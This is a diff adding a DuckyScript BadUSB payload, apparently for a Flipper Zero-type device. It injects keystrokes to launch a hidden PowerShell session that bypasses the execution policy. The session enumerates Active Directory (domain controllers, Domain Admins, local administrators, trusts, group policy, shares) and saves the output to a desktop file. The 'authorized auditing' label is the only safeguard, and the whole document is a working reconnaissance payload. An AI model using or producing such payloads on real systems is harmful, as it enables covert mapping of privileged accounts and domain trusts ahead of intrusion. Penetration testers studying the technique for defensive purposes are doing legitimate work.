@@ -1,0 +1,9 @@
+REM CYBERFLIPPER — Windows AD Enumeration (BashBunny-inspired)
+REM Enumerates Active Directory info, domain controllers,
+REM group policy, trust relationships
+REM FOR AUTHORIZED DOMAIN AUDITING ONLY
+DELAY 500
+GUI r
+DELAY 300
+STRING powershell -NoP -W Hidden -Exec Bypass -C "$f=[Environment]::GetFolderPath('Desktop')+'\ad_enum_'+$(hostname)+'.txt';'=== AD ENUMERATION ===' | Out-File $f;'Date: '+(Get-Date) | Out-File -Append $f;'--- DOMAIN INFO ---' | Out-File -Append $f;try{[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | Out-File -Append $f}catch{'Not domain joined' | Out-File -Append $f};'--- DOMAIN CONTROLLERS ---' | Out-File -Append $f;try{nltest /dclist: | Out-File -Append $f}catch{'N/A' | Out-File -Append $f};'--- GROUP POLICY ---' | Out-File -Append $f;gpresult /r | Out-File -Append $f;'--- LOCAL ADMINS ---' | Out-File -Append $f;net localgroup administrators | Out-File -Append $f;'--- DOMAIN ADMINS ---' | Out-File -Append $f;try{net group 'Domain Admins' /domain | Out-File -Append $f}catch{'N/A' | Out-File -Append $f};'--- TRUST INFO ---' | Out-File -Append $f;try{nltest /domain_trusts | Out-File -Append $f}catch{'N/A' | Out-File -Append $f};'--- SHARES ---' | Out-File -Append $f;net view /all | Out-File -Append $f;'=== END ===' | Out-File -Append $f"
+ENTER
